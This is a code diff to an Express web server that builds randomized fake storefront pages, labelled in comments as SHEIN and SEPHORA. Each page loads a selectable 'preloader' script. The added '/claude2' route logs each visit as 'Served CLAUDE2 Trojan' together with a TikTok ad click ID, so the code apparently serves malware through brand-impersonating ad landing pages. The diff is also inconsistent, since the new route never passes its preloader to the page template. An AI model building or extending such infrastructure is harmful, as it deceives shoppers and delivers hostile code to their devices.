@@ -2431,11 +2431,11 @@ app.get('/abdu/:slug', (req, res, next) => {
 const layouts = [
     {
         name: 'minimal',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Minimal</title>
@@ -2473,7 +2473,7 @@ const layouts = [
     },
     {
         name: 'bold',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
@@ -2510,11 +2510,11 @@ const layouts = [
     },
     {
         name: 'elegant',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Elegant</title>
@@ -2551,11 +2551,11 @@ const layouts = [
     },
     {
         name: 'modern',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Modern</title>
@@ -2588,11 +2588,11 @@ const layouts = [
     },
     {
         name: 'retro',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Retro</title>
@@ -2625,11 +2625,11 @@ const layouts = [
     },
     {
         name: 'minimalist',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Minimalist</title>
@@ -2667,11 +2667,11 @@ const layouts = [
     },
     {
         name: 'artsy',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Artsy</title>
@@ -2710,11 +2710,11 @@ const layouts = [
     },
     {
         name: 'vintage',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Vintage</title>
@@ -2753,11 +2753,11 @@ const layouts = [
     },
     {
         name: 'neon',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Neon</title>
@@ -2798,11 +2798,11 @@ const layouts = [
     },
     {
         name: 'eco',
-        generateHTML: (store, product, banner, backgroundColor, hash) => `
+        generateHTML: (store, product, banner, backgroundColor, hash, preloader) => `
             <!DOCTYPE html>
             <html lang="en">
             <head>
-                <script src="/cdn/preloader.js"></script>
+                <script src="/cdn/${preloader}"></script>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>${store} - Eco-Friendly</title>
@@ -2872,9 +2872,11 @@ function generateColor(hash) {
     return '#' + hash.substr(0, 6);
 }
 
+// SHEIN
 app.get('/claude', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
+    const preloader = "preloader.js";
     let ttclid = req.query.ttclid || 'Not specified';
     if (ttclid !== 'Not specified') {
         ttclid = ttclid.slice(0, 5);
@@ -2888,7 +2890,23 @@ app.get('/claude', extractSubdomain, (req, res, next) => {
     res.send(html);
 });
 
-
+// SEPHORA
+app.get('/claude2', extractSubdomain, (req, res, next) => {
+    const slug = req.subdomain;
+    const hash = generateHash(slug);
+    const preloader = "preloader2.js";
+    let ttclid = req.query.ttclid || 'Not specified';
+    if (ttclid !== 'Not specified') {
+        ttclid = ttclid.slice(0, 5);
+    }
+    console.log(`Served CLAUDE2 Trojan (${slug})::(${ttclid})`);
+    const layout = selectFromArray(layouts, parseInt(hash.substr(0, 8), 16));
+    const product = selectFromArray(products, parseInt(hash.substr(8, 8), 16));
+    const banner = selectFromArray(banners, parseInt(hash.substr(16, 8), 16));
+    const backgroundColor = generateColor(hash);
+    const html = layout.generateHTML(slug, product, banner, backgroundColor, hash);
+    res.send(html);
+});
 
 
 
